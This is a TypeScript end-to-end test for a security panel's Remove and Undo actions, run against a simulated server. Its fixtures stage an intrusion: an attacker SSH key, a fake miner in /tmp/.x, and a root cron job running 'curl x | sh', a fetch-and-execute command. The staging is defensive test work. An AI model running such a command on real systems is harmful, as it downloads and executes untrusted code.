// Remove and Undo from the Security page, end to end: a finding, the API's request, the real helper
// (scripts/host-act.py) on a made-up server with its commands recorded, the result read back, the undo.
// Needs an EMPTY database (run by freshdb.sh); no containers, no root.
import os from "node:os";
import path from "node:path";
import fs from "node:fs";
import crypto from "node:crypto";
import { execFileSync } from "node:child_process";

const ACT_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "dk-actions-"));
process.env.HOST_ACTIONS_DIR = ACT_DIR;

async function main() {
  const root = process.cwd();
  const { appRouter } = await import(root + "/src/trpc/index");
  const { db, users, auditLogs, hostActions } = await import("@dbbkp/db");
  const { issueSession } = await import(root + "/src/services/team");
  const { ingest, parseReport } = await import(root + "/src/services/hostwatch");
  const jwt = (await import("jsonwebtoken")).default;
  const bcrypt = (await import("bcryptjs")).default;
  let failed = 0;
  const pass = (ok: unknown, label: string, extra = "") => { if (!ok) failed++; console.log((ok ? "PASS  " : "FAIL  ") + label + (extra ? "  | " + extra : "")); };
  const code = async (p: Promise<unknown>) => p.then(() => "OK", (e: any) => e?.code ?? String(e?.message).slice(0, 60));
  const msg = async (p: Promise<unknown>) => p.then(() => "OK", (e: any) => String(e?.message));
  const mk = async (username: string, role: string, extra: any = {}) => (await db.insert(users).values({ email: username + "@t.local", username, passwordHash: await bcrypt.hash("x".repeat(14), 4), role, ...extra }).returning())[0];
  const as = async (u: any, apiToken?: any) => { const s = await issueSession(u); const p: any = jwt.decode(s.token); return appRouter.createCaller({ user: { sub: u.id, sid: p.sid, username: u.username, role: u.role, mustChangePassword: false }, ip: "10.0.0.1", ...(apiToken ? { apiToken } : {}) }); };
  const ownerRow = await mk("owner", "admin");
  const owner = await as(ownerRow), dev = await as(await mk("dev", "user", { teamRole: "developer" })), agent = await as(ownerRow, { id: "t", scope: "full" });

  // the made-up server
  const R = fs.mkdtempSync(path.join(os.tmpdir(), "dk-actroot-")), STATE = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "dk-actstate-")), "s"), CMDS = path.join(ACT_DIR, "commands.jsonl");
  const put = (p: string, text: string, mode = 0o644) => { fs.mkdirSync(path.dirname(R + p), { recursive: true }); fs.writeFileSync(R + p, text); fs.chmodSync(R + p, mode); };
  const fpOf = (blob: Buffer) => "SHA256:" + crypto.createHash("sha256").update(blob).digest("base64").replace(/=+$/, "");
  const evil = Buffer.from("evil-key"), mine = Buffer.from("admin-key");
  put("/etc/passwd", "root:x:0:0::/root:/bin/bash\nsupport:x:1001:1001::/home/support:/bin/sh\n");
  put("/root/.ssh/authorized_keys", `ssh-ed25519 ${mine.toString("base64")} admin@laptop\nssh-ed25519 ${evil.toString("base64")} x\n`, 0o600);
  put("/tmp/.x/kworkerd", "MZ miner", 0o755);
  fs.mkdirSync(R + "/proc/4242", { recursive: true });
  fs.symlinkSync("/tmp/.x/kworkerd", R + "/proc/4242/exe");
  const helperPath = process.env.HOST_ACT || [path.resolve(root, "../../scripts/host-act.py"), "/work/scripts/host-act.py"].find((p) => fs.existsSync(p))!;
  const helper = () => { fs.writeFileSync(CMDS, ""); execFileSync("python3", [helperPath, "--dir", ACT_DIR, "--state", STATE, "--root", R, "--fake-commands", CMDS]); return fs.readFileSync(CMDS, "utf8").trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)); };

  // findings
  const it = (kind: string, key: string, label: string, detail: any, fp = "f1") => ({ kind, key, label, detail, fp });
  const base = [it("user", "user:root", "root", { uid: 0, login: true }), it("sshd", "sshd:PasswordAuthentication", "PasswordAuthentication", { setting: "PasswordAuthentication", value: "no" })];
  let t = Date.now();
  const report = (items: any[]) => parseReport(JSON.stringify({ version: 1, generatedAt: new Date((t += 60_000)).toISOString(), hostname: "srv", scanned: ["user", "admin", "ssh_key", "sshd", "cron", "process", "outbound", "container"], items }));
  await ingest(report(base));
  await owner.host.acceptInitial();
  const attack = [
    ...base.filter((b) => b.kind !== "sshd"),
    it("sshd", "sshd:PasswordAuthentication", "PasswordAuthentication", { setting: "PasswordAuthentication", value: "yes" }, "f2"),
    it("ssh_key", `key:root:${fpOf(evil)}`, "x (root)", { user: "root", fingerprint: fpOf(evil), comment: "x", file: "/root/.ssh/authorized_keys" }),
    it("process", "proc:/tmp/.x/kworkerd", "kworkerd", { exe: "/tmp/.x/kworkerd", signs: ["temp"], pids: [4242], count: 1, user: "support", command: "/tmp/.x/kworkerd", container: null }),
    it("cron", "cron:/etc/cron.d/gone:abcdefabcdef", "curl", { file: "/etc/cron.d/gone", user: "root", schedule: "* * * * *", command: "curl x | sh" }),
  ];
  await ingest(report(attack));
  const list: any[] = await owner.host.findings();
  const f = (key: string) => list.find((x) => x.key === key);
  const keyF = f(`key:root:${fpOf(evil)}`), procF = f("proc:/tmp/.x/kworkerd"), sshdF = f("sshd:PasswordAuthentication"), cronF = f("cron:/etc/cron.d/gone:abcdefabcdef");
  pass(keyF.autoRemove?.text.includes("Remove the key") && procF.autoRemove?.text.includes("quarantine") && sshdF.autoRemove === null, "each finding says what Remove would do; an SSH setting is left to be fixed by hand");

  // no helper yet
  pass(((await owner.host.helper()) as any).running === false && (await msg(owner.host.remove({ id: keyF.id }))).includes("not running"), "without the helper on the server nothing is sent");
  helper();
  pass(((await owner.host.helper()) as any).running === true, "once the helper has run, the panel knows it is there");

  // who may
  pass((await code(dev.host.remove({ id: keyF.id }))) === "FORBIDDEN" && (await code(agent.host.remove({ id: keyF.id }))) === "FORBIDDEN", "a developer and an AI agent cannot remove anything");
  pass((await msg(owner.host.remove({ id: sshdF.id }))).includes("by hand"), "nor can an admin remove what is meant to be fixed by hand");

  // remove a key, then undo
  const row: any = await owner.host.remove({ id: keyF.id });
  const req = JSON.parse(fs.readFileSync(path.join(ACT_DIR, "requests", row.id + ".json"), "utf8"));
  pass(row.status === "pending" && req.action === "remove-ssh-key" && req.target.fingerprint === fpOf(evil) && req.requestedBy === "owner", "Remove writes one request for the helper, with the target rebuilt from the finding");
  pass((await msg(owner.host.remove({ id: keyF.id }))).includes("already working"), "a second Remove while the first is waiting is refused");
  helper();
  let acts: any[] = await owner.host.actions();
  let a = acts.find((x) => x.id === row.id);
  const keys = fs.readFileSync(R + "/root/.ssh/authorized_keys", "utf8");
  pass(a.status === "done" && a.canUndo && a.message.startsWith("Removed the key") && !keys.includes(evil.toString("base64")) && keys.includes("admin@laptop"), "the helper removed the key and the panel read its answer", a.message);
  pass((await code(dev.host.undo({ actionId: row.id }))) === "FORBIDDEN" && (await code(agent.host.undo({ actionId: row.id }))) === "FORBIDDEN", "undo is for admins in the panel too");
  await owner.host.undo({ actionId: row.id });
  helper();
  a = ((await owner.host.actions()) as any[]).find((x) => x.id === row.id);
  pass(a.status === "undone" && fs.readFileSync(R + "/root/.ssh/authorized_keys", "utf8").includes(evil.toString("base64")), "undo put the key back", a.undoMessage);
  pass((await msg(owner.host.undo({ actionId: row.id }))).includes("nothing to undo"), "it cannot be undone twice");

  // a program
  const prow: any = await owner.host.remove({ id: procF.id });
  const cmds = helper();
  a = ((await owner.host.actions()) as any[]).find((x) => x.id === prow.id);
  pass(a.status === "done" && JSON.stringify(cmds) === JSON.stringify([["kill", "-STOP", "4242"], ["kill", "-KILL", "4242"]]) && !fs.existsSync(R + "/tmp/.x/kworkerd"), "a program is frozen, stopped, and its file put in quarantine", JSON.stringify(cmds));

  // a request the server refuses
  const crow: any = await owner.host.remove({ id: cronF.id });
  helper();
  a = ((await owner.host.actions()) as any[]).find((x) => x.id === crow.id);
  pass(a.status === "failed" && a.message.includes("Nothing was changed") && !a.canUndo, "when the server refuses, the panel says so and offers no undo", a.message);

  // a finding that is gone
  await ingest(report(base));
  const gone: any[] = await owner.host.findings();
  pass((await msg(owner.host.remove({ id: gone.find((x) => x.key === "proc:/tmp/.x/kworkerd").id }))).includes("already gone"), "a finding that is gone from the server cannot be removed again");

  await new Promise((r) => setTimeout(r, 500));
  const kinds = new Set((await db.select({ action: auditLogs.action }).from(auditLogs)).map((x: any) => x.action));
  pass(kinds.has("host_remove") && kinds.has("host_undo"), "every Remove and Undo is in the audit log");
  pass((await db.select().from(hostActions)).length === 3, "and in the list of what was removed");
  console.log(failed ? `${failed} FAILED` : "remove and undo hold");
  process.exit(failed ? 1 : 0);
}
main().catch((e) => { console.error("CRASH", e); process.exit(1); });
